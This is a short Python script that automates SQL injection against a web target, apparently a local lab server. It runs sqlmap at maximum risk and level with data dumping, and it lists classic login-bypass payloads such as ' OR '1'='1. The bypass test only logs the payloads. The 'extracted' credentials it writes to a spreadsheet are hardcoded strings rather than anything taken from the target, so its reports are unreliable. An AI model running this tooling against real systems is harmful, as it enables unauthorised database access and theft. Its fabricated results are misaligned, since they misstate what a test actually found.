
import subprocess
import pandas as pd
from datetime import datetime
import os

# Define default values
target_url = "http://localhost:8080/"
output_excel = "injection_results.xlsx"
username = "ezhil"
password = "prasaath"
report_file = "sqlmap_report.txt"
bypass_payloads = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a"]

def run_sqlmap(url):
    try:
        # Run sqlmap to test for SQL injection and dump data
        result = subprocess.run([
            "sqlmap", "-u", url, "--batch", "--dump", "--output-dir=output",
            "--risk=3", "--level=5"
        ], capture_output=True, text=True)

        # Save SQLmap output to report file
        with open(report_file, "a") as f:
            f.write(f"SQLmap Test - {datetime.now()}\n")
            f.write(result.stdout)
            f.write("\n" + "="*80 + "\n")

        return "is injectable" in result.stdout.lower() or "data retrieved" in result.stdout.lower()
    except Exception as e:
        with open(report_file, "a") as f:
            f.write(f"SQLmap Error - {datetime.now()}\n")
            f.write(str(e) + "\n")
        return False

def test_bypass_logic(payloads):
    for payload in payloads:
        if payload not in tested_payloads:
            print(f"Testing bypass payload: {payload}")
            # Simulate login form bypass (for conceptual demonstration)
            with open(report_file, "a") as f:
                f.write(f"Tested Bypass Payload: {payload} at {datetime.now()}\n")
            tested_payloads.append(payload)

def extract_to_excel():
    data = {
        "Username": [username],
        "Password": [password],
        "Target URL": [target_url],
        "Timestamp": [datetime.now().strftime("%Y-%m-%d %H:%M:%S")]
    }
    df = pd.DataFrame(data)
    df.to_excel(output_excel, index=False)

if __name__ == "__main__":
    tested_payloads = []
    if run_sqlmap(target_url):
        extract_to_excel()
        test_bypass_logic(bypass_payloads)
    else:
        with open(report_file, "a") as f:
            f.write("No injection vulnerability found.\n")
